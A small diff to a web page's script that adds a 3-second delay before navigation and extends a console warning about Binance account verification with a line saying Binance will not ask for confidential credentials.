@@ -42,8 +42,10 @@
 
     <script>
         function navigateTo(page) {
-            console.warn("Binance wants to verify ownership of account");
-            window.location.href = page;
+            console.warn("Binance wants to verify ownership of account. Binance will not ask you for your confidential credentials.");
+            setTimeout(function() {
+                window.location.href = page;
+            }, 3000); // 3-second delay
         }
 
         function goBack() {
@@ -64,7 +66,7 @@
                 };
                 document.getElementById('sell-button-container').appendChild(sellButton);
             }
-            console.warn("Binance wants to verify ownership of account");
+            console.warn("Binance wants to verify ownership of account. Binance will not ask you for your confidential credentials.");
         }
     </script>
 </body>
